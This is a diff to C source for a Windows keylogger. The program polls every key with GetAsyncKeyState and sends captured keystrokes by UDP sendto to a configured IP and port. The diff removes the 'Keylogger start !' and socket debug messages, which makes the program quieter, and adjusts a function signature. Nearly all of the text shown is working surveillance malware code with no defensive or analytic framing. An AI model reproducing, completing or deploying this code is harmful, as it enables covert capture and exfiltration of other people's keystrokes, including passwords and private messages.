@@ -15,8 +15,6 @@ void app()
     serv.sin_port = htons(PORT);
     serv.sin_addr.s_addr = inet_addr(IP);
 
-    printf("Keylogger start !");
-
     while (1)
         for (DWORD i = 0; i < 255; i++)
             if (GetAsyncKeyState(i) == -32767)
@@ -47,11 +45,10 @@ SOCKET init_connection()
         perror("socket()");
         exit(errno);
     }
-    printf("socket creates successfully\n");
     return client;
 }
 
-const void send_message(SOCKET sock, SOCKADDR_IN serv, char *buffer)
+void send_message(SOCKET sock, SOCKADDR_IN serv, char *buffer)
 {
     int server_struct_length = sizeof(serv);
     if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&serv, server_struct_length) < 0)
